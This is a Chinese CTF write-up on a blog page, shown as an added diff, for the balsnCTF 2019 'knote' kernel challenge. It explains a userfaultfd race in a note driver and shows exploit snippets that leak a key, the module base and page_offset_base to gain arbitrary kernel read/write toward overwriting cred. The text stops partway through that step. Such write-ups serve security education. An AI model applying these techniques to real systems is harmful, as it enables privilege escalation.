@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux kernel pwn,CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="复现一下balsnCTF 2019 knote，利用到了缺页中断时的条件竞争来修改堆块的size造成溢出，从而实现任意地址读写。">
+<meta name="keywords" content="Linux kernel pwn,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="balsnCTF 2019 knote">
+<meta property="og:url" content="http://x3h1n.github.io/2019/11/07/balsnCTF-2019-knote/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="复现一下balsnCTF 2019 knote，利用到了缺页中断时的条件竞争来修改堆块的size造成溢出，从而实现任意地址读写。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-08T04:09:44.972Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="balsnCTF 2019 knote">
+<meta name="twitter:description" content="复现一下balsnCTF 2019 knote，利用到了缺页中断时的条件竞争来修改堆块的size造成溢出，从而实现任意地址读写。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/11/07/balsnCTF-2019-knote/"/>
+
+
+
+
+
+  <title>balsnCTF 2019 knote | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/11/07/balsnCTF-2019-knote/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">balsnCTF 2019 knote</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-07T16:32:20+08:00">
+                2019-11-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>复现一下balsnCTF 2019 knote，利用到了缺页中断时的条件竞争来修改堆块的size造成溢出，从而实现任意地址读写。<br><a id="more"></a></p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>驱动程序note.ko，使用IDA打开，没有我们熟悉的ioctl函数，先从init_module开始看，这里函数返回了一个misc_register(&amp;unk_620)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  qword_B40 = (__int64)&amp;unk_B60;</span><br><span class="line">  <span class="keyword">return</span> misc_register(&amp;unk_620);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个函数的作用是注册一个miscellaneous device，这个device的结构是struct miscdevice * misc，可以看一下这个结构体的组成：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v5.1.9/source/include/linux/miscdevice.h#L65</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>  &#123;</span></span><br><span class="line">	<span class="keyword">int</span> minor;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">attribute_group</span> **<span class="title">groups</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *nodename;</span><br><span class="line">	<span class="keyword">umode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>那么对应到程序中，我们可以再IDA里对应到结构体中的成员：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000620</span> unk_620         db  <span class="number">0B</span>h                 ; DATA XREF: init_module+<span class="number">5</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000620</span>                                         ; cleanup_module+<span class="number">5</span>↑o   <span class="comment">//minor</span></span><br><span class="line">.data:<span class="number">0000000000000621</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000622</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000623</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000624</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000625</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000626</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000627</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000628</span>                 dq offset aNote         ; <span class="string">"note"</span> <span class="comment">//name</span></span><br><span class="line">.data:<span class="number">0000000000000630</span>                 dq offset unk_680   </span><br><span class="line">.data:<span class="number">0000000000000638</span>                 align <span class="number">80</span>h</span><br><span class="line">.data:<span class="number">0000000000000680</span> unk_680         db    <span class="number">0</span>                 ; DATA XREF: .data:<span class="number">0000000000000630</span>↑o  <span class="comment">//fops</span></span><br><span class="line">.data:<span class="number">0000000000000681</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000682</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000683</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000684</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000685</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000686</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000687</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0000000000000688</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<p>fops是一个file_operations结构，这个数据结构的具体定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v5.1.9/source/include/linux/fs.h#L1785</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">	<span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">	<span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);   <span class="comment">//unk_680  </span></span><br><span class="line">	<span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure></p>
+<p>在IDA里可以看到，unk_680是fops的起始地址，从unk_680到unk_6D0数据均为0，在unk_6D0处有一个函数指针，偏移正好是unlocked_ioctl，同样我们也可以得到open的函数指针。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000000006</span>D0                 dq offset unlocked_ioctl</span><br><span class="line">.data:<span class="number">00000000000006F</span>0                 dq offset open</span><br></pre></td></tr></table></figure></p>
+<p>unlocked_ioctl与ioctl存在区别，资料来源于<a href="https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html" target="_blank" rel="noopener">这里</a>，unlocked_ioctl不使用linux内核提供的全局同步锁，并且所有原语必须由模块作者实现，那就是说可能存在条件竞争。<br>程序逻辑应该都在unlocked_ioctl这个函数里面了，可以看到，根据参数的不同，参数有-253，-254，-255和-256，程序提供了4个功能，比较容易判断的是-254，这个是show note的功能，因为有一个copy_to_user，-253是clean note，因为它有一个循环的清空操作，-256是一个add note操作，因为开始有一个循环操作，在全局数组中寻找为空的数组，这和我们做的应用层的堆的题目是类似的。包括参考网上的博客以及利用F5反编译出的伪代码，我们可以得到程序中涉及到的两个结构体，一个是note自身的结构体note，另外一个是进行交互时的参数的结构体args：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000 note            struc ; (sizeof=0x20, mappedto_3)</span><br><span class="line">00000000 key             dq ?</span><br><span class="line">00000008 length          dq ?</span><br><span class="line">00000010 contentPtr      dq ?</span><br><span class="line">00000018 content         db 8 dup(?)</span><br><span class="line">00000020 note            ends</span><br><span class="line">00000020</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 args            struc ; (sizeof=0x18, mappedto_4)</span><br><span class="line">00000000 idx             dq ?</span><br><span class="line">00000008 length          dq ?</span><br><span class="line">00000010 userptr         dq ?</span><br><span class="line">00000018 args            ends</span><br></pre></td></tr></table></figure></p>
+<p>首先看一下add note的功能，首先遍历notes数组，找到一个空的地址，最多允许申请16个note。如果找到一个空的地址，就跳出循环，分配到这个空间用来存储note结构体及content。但是contentPtr做了一个操作，将contentPtr减去了page_offset_base，它的content是每个字节都要与key进行异或，然后保存在content中。<br>存入到note中的content都要先逐字节与key进行异或，然后保存，key的值定义如下，current_task是一个task_struct结构，它的0x7E8偏移是current_task-&gt;mm，mm是一个mm_struct结构，它的80字节偏移处current_task.mm-&gt;pgd。同样后面的show note是输出之前content与key异或，然后输出真实的content，edit note也是edit之后与key进行异或，然后存储在相应的分配的空间中。content最大长度限制在0x100字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_note-&gt;key = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x7E8</span>) + <span class="number">80L</span>L)</span><br></pre></td></tr></table></figure></p>
+<p>然后是edit note，利用索引找到对应的note，然后将contentPtr与page_offset_base相加，取得真正的contentPtr，然后定位到content，edit之后再与key进行异或然后存储到contentPtr指向的空间中。<br>show note就是contentPtr与page_offset_base相加之后，获得真正的contentPtr，然后与key异或后，最后输出。<br>clean note将所有的note清空。</p>
+<h1 id="调试过程中遇到的错误"><a href="#调试过程中遇到的错误" class="headerlink" title="调试过程中遇到的错误"></a>调试过程中遇到的错误</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ $ uname -a</span><br><span class="line">Linux (none) 5.1.9 #1 SMP Fri Jun 14 17:32:01 CST 2019 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>在/initramfs/etc/init.d中修改为root权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 0 sh</span><br></pre></td></tr></table></figure></p>
+<p>修改run.sh，关闭地址随机化，将kaslr修改为nokaslr：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &apos;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&apos;</span><br></pre></td></tr></table></figure></p>
+<p>因为文件系统修改之后重新打包会出现错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/balsnCTF_knote$ ./run.sh</span><br><span class="line">mount: you must be root</span><br><span class="line">mount: you must be root</span><br><span class="line">mount: you must be root</span><br><span class="line">/etc/init.d/rcS: line 8: can&apos;t create /proc/sys/kernel/dmesg_restrict: nonexistent directory</span><br><span class="line">/etc/init.d/rcS: line 9: can&apos;t create /proc/sys/kernel/kptr_restrict: nonexistent directory</span><br><span class="line">insmod: can&apos;t insert &apos;note.ko&apos;: Operation not permitted</span><br><span class="line">chmod: /dev/note: No such file or directory</span><br><span class="line">cttyhack: can&apos;t open &apos;/dev/ttyS0&apos;: No such file or directory</span><br><span class="line">setuidgid: setgroups: Operation not permitted</span><br><span class="line">poweroff: Operation not permitted</span><br><span class="line">can&apos;t open /dev/tty4: No such file or directory</span><br><span class="line">can&apos;t open /dev/tty3: No such file or directory</span><br><span class="line">can&apos;t open /dev/tty2: No such file or directory</span><br></pre></td></tr></table></figure></p>
+<p>我的解决方式是去查看/bin/busybox的权限，发现即使我改了initramfs的权限为777之后，子文件夹的权限仍然没有变化，因此我将/bin/busybox的权限修改为777，另外，与其他内核题不相同，我见到的init文件都是放在文件系统根目录下，但这个题目根目录下的init文件是空的，真正的在./etc/init.d/rcS文件中，我也修改了这个文件的权限是777，还在rcS文件中修改了/bin/busybox的权限为777。另外，打包脚本我之前放在了文件系统外，后来我把它移到了文件系统中。各个方面共同作用，这样就可以正常启动了。</p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>整个利用过程涉及到以下知识，首先contentPtr相加的那个page_offset_base涉及到别名页的概念。</p>
+<h2 id="别名页"><a href="#别名页" class="headerlink" title="别名页"></a>别名页</h2><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>利用过程使用了两种方法，覆写cred结构体和修改modrpobe_path，exp参考了r3kapig的exp。</p>
+<h2 id="覆写cred结构体"><a href="#覆写cred结构体" class="headerlink" title="覆写cred结构体"></a>覆写cred结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">init();</span><br><span class="line">create(buffer, <span class="number">0x10</span>);</span><br><span class="line">register_userfault();</span><br><span class="line">edit(<span class="number">0</span>, FAULT_PAGE, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>note0的buf的位置是note1的key的位置，那么buf[8]就是note1的length所在的位置，buf[8]=0xf0，即将note1的length修改为0xf0。<br>note1的buf为空，长度为0xf0，因此show note1的时候输出的是key的值，这样就可以泄露key值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">1</span>, buffer);</span><br><span class="line"><span class="keyword">uintptr_t</span> key = *(<span class="keyword">uintptr_t</span>*)buffer;</span><br></pre></td></tr></table></figure></p>
+<p>此时再申请一个大小为0的note2，其实到现在我们已经有了任意地址读写的能力，因为note1的大小被修改为0xf0，通过编辑note1就可以修改note2的contentPtr的地址，然后通过show note2来泄露地址，注意这里要将想泄露的地址与key进行异或，然后再写入note1，因为edit里有一个异或加密操作。通过edit note2可以进行写操作。</p>
+<p>首先show note1，note1的contentPtr所指向的地址就是note2的开头，那么note1所泄露的内容的偏移0x10处，存储着note2的contentPtr的地址，这样就泄露了contentPtr的地址。利用这个地址可以得到module_base。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> data_off = *(<span class="keyword">uintptr_t</span>*)(buffer + <span class="number">0x10</span>) ^ key;</span><br><span class="line"><span class="keyword">intptr_t</span> module_base = data_off - <span class="number">0x2568</span>;</span><br></pre></td></tr></table></figure></p>
+<p>在IDA里也可以看到，程序存储的contentPtr的地址其实是real contentPtr + page_offset_base的地址，所以需要加上page_offset_base，才是真正的contentPtr。page_offset_base如何得到呢？在程序中通过以下指令获得page_offset_base，这条指令的过程其实是mov r12,[rip+offset]，在运行到这条指令时，rip其实是module_base+0x1fe，offset存储在module_base+0x1fa处。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000001F7                 mov     r12, cs:page_offset_base</span><br></pre></td></tr></table></figure></p>
+<p>通过前面的步骤我们泄露的module_base可以将note2的contentPtr修改为(module_base+0x1fa)^key，然后再show note2，这样我们就能泄露这个offset的值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> page_base_off = module_base + <span class="number">0x1fa</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"page_base_off: 0x%lx\n"</span>,page_base_off);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uintptr_t</span>* fake_note = (<span class="keyword">uintptr_t</span>*)buffer;</span><br><span class="line">fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">fake_note[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">fake_note[<span class="number">2</span>] = page_base_off ^ key;</span><br><span class="line">edit(<span class="number">1</span>, buffer, <span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">int32_t</span> rip_to_page_base;</span><br><span class="line">show(<span class="number">2</span>, (<span class="keyword">char</span>*)&amp;rip_to_page_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"rip_to_page_base=0x%x\n"</span>, rip_to_page_base);</span><br></pre></td></tr></table></figure></p>
+<p>得到了这个offset的值为rip_to_page_base，然后将note2的contentPtr修改为(rip+rip_to_page_base)^key，注意此时的rip是module_base+0x1fe，然后show note2来得到真正的page_offset_base。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">page_base_off = module_base + <span class="number">0x1fe</span> + rip_to_page_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"page_base_off=0x%lx\n"</span>, page_base_off);</span><br><span class="line">fake_note[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">fake_note[<span class="number">2</span>] = page_base_off ^ key;</span><br><span class="line">edit(<span class="number">1</span>, buffer, <span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">uintptr_t</span> base_addr;</span><br><span class="line">show(<span class="number">2</span>, (<span class="keyword">char</span>*)&amp;base_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"base_addr=0x%lx\n"</span>, base_addr);</span><br></pre></td></tr></table></figure></p>
+<p>此时，我们得到了page_offset_base，就可以进行任意地址写了。首先泄露cred的地址，利用之前ret2dir用到的task_struct的一个成员char comm[TASK_COMM_LEN]，可以使用prctl函数进行修改为自定义的长度为16个字节的字符串：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://man7.org/linux/man-pages/man2/prctl.2.html</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,<span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br><span class="line"></span><br><span class="line">PR_SET_NAME (since Linux <span class="number">2.6</span><span class="number">.9</span>)</span><br><span class="line">              Set the name of the calling thread, <span class="keyword">using</span> the value in the</span><br><span class="line">              location pointed to by (char *) arg2.  The name can be up to</span><br><span class="line">              <span class="number">16</span> bytes <span class="keyword">long</span>, including the terminating null byte.  (If the</span><br><span class="line">              length of the <span class="built_in">string</span>, including the terminating null byte,</span><br><span class="line">              exceeds <span class="number">16</span> bytes, the <span class="built_in">string</span> is silently truncated.)  This is</span><br><span class="line">              <span class="function">the same attribute that can be <span class="built_in">set</span> via <span class="title">pthread_setname_np</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">              and retrieved using pthread_getname_np(3).  The attribute is</span><br><span class="line">              likewise accessible via /proc/self/task/[tid]/comm, where tid</span><br><span class="line">              is the name of the calling thread.</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/ident/TASK_COMM_LEN</span></span><br><span class="line"><span class="comment">/* Task command name length */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_COMM_LEN 16</span></span><br></pre></td></tr></table></figure></p>
